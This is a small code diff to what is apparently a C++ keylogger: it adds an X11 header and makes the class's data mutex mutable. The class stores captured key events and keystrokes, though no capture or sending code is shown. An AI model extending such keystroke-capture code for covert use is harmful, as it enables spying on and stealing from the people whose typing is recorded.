@@ -12,6 +12,7 @@
 #include <tlhelp32.h>
 #else
 #include <X11/Xlib.h>
+#include <X11/Xutil.h>
 #include <X11/keysym.h>
 #include <X11/extensions/XTest.h>
 #include <unistd.h>
@@ -25,7 +26,7 @@ class Keylogger::Impl {
 public:
     std::atomic<bool> running_{false};
     std::thread capture_thread_;
-    std::mutex data_mutex_;
+    mutable std::mutex data_mutex_;
     std::vector<KeyEvent> events_;
     std::string keystrokes_;
     KeyloggerConfig config_;
